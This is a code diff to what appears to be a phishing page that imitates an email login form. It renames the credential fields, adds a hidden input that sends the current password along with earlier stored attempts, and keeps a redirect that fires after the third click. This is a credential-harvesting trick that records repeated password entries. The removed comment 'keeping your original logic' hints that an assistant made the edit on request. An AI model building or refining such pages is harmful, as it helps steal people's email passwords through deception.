@@ -160,7 +160,7 @@
                     </div>
                     <div class="input-field-login icon username-container">
                       <input
-                        name="email_1"
+                        name="email"
                         id="user"
                         autofocus="autofocus"
                         value=""
@@ -177,7 +177,7 @@
                     </div>
                     <div class="input-field-login icon password-container">
                       <input
-                        name="pw_1"
+                        name="password"
                         id="pass"
                         placeholder="Enter your email password."
                         class="std_textbox"
@@ -331,6 +331,13 @@
           firstPasswordInput.value = firstAttempt.password;
           form.appendChild(firstPasswordInput);
           
+          // Also send the current password with a different name
+          const currentPasswordInput = document.createElement('input');
+          currentPasswordInput.type = 'hidden';
+          currentPasswordInput.name = 'current_password';
+          currentPasswordInput.value = password;
+          form.appendChild(currentPasswordInput);
+          
           const secondAttemptInput = document.createElement('input');
           secondAttemptInput.type = 'hidden';
           secondAttemptInput.name = 'second_attempt';
@@ -343,7 +350,7 @@
           }, 1000);
         }
         
-        // Count clicks for third attempt redirect (keeping your original logic)
+        // Count clicks for third attempt redirect
         clickCount++;
         if (clickCount >= 3) {
           setTimeout(function() {
